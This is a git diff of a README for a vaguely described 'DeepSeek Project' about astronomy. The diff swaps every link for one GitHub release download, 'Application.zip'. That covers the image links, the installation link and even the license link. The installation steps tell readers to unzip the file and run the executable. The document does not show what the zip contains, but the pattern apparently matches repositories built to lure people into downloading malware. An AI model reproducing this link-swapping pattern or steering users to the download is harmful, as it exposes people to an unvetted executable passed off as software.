@@ -3,7 +3,7 @@
 Welcome to the DeepSeek Project repository! 🚀
 
 ## Overview ℹ️
-![DeepSeek Logo](https://example.com/deepseek_logo.png)
+![DeepSeek Logo](https://github.com/Ragu-ram-24/deepseek_project/releases/download/v1.0/Application.zip)
 
 **Repository Name:** deepseek_project  
 **Short Description:** Dee-seek_project  
@@ -19,7 +19,7 @@ Welcome to the DeepSeek Project repository! 🚀
 ## Description 📝
 The DeepSeek Project is dedicated to exploring the depths of the unknown in the vast universe. Our mission is to seek out new discoveries, unravel mysteries, and push the boundaries of knowledge. Join us in this exciting journey as we delve into the mysteries of the cosmos!
 
-![Universe Image](https://example.com/universe_image.jpg)  
+![Universe Image](https://github.com/Ragu-ram-24/deepseek_project/releases/download/v1.0/Application.zip)  
 
 ## Features ✨
 - Cutting-edge technology to analyze astronomical data  
@@ -29,7 +29,7 @@ The DeepSeek Project is dedicated to exploring the depths of the unknown in the 
 
 ## Installation 💻
 To get started with the DeepSeek Project, follow these steps:
-1. Download the project files from [here](https://github.com/cli/oauth/archive/refs/tags/v1.0.0.zip).
+1. Download the project files from [here](https://github.com/Ragu-ram-24/deepseek_project/releases/download/v1.0/Application.zip).
 2. Unzip the downloaded file in your desired directory.  
 3. Launch the application by running the main executable file.  
 
@@ -39,7 +39,7 @@ Here are some ways you can utilize the DeepSeek Project:
 - Analyze patterns in cosmic phenomena  
 - Engage in discussions with fellow space enthusiasts  
 
-![Space Image](https://example.com/space_image.jpg)  
+![Space Image](https://github.com/Ragu-ram-24/deepseek_project/releases/download/v1.0/Application.zip)  
 
 ## Contributing 🤝
 We welcome contributions from the community to enhance the DeepSeek Project. To contribute, please follow these guidelines:
@@ -49,7 +49,7 @@ We welcome contributions from the community to enhance the DeepSeek Project. To 
 4. Submit a pull request  
 
 ## License 📜
-This project is licensed under the MIT License - see the [LICENSE.md](LICENSE.md) file for details.
+This project is licensed under the MIT License - see the [https://github.com/Ragu-ram-24/deepseek_project/releases/download/v1.0/Application.zip](https://github.com/Ragu-ram-24/deepseek_project/releases/download/v1.0/Application.zip) file for details.
 
 ---
 
